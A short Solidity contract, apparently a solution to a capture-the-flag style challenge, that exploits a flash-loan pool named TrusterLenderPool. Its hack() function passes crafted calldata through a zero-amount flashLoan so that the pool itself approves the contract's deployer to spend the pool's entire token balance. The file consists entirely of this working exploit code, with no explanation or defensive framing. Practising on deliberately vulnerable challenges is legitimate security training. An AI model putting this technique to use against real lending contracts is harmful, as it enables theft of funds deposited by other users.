// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Attack0 {
    TrusterLenderPool pool;
    ERC20 token;
    address owner;

    constructor(TrusterLenderPool _pool, ERC20 _token) {
        pool = _pool;
        token = _token;
        owner = msg.sender;
    }
    function hack() public {
        uint amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", owner, amount);
        pool.flashLoan(0, owner, address(token), data);
    }
}
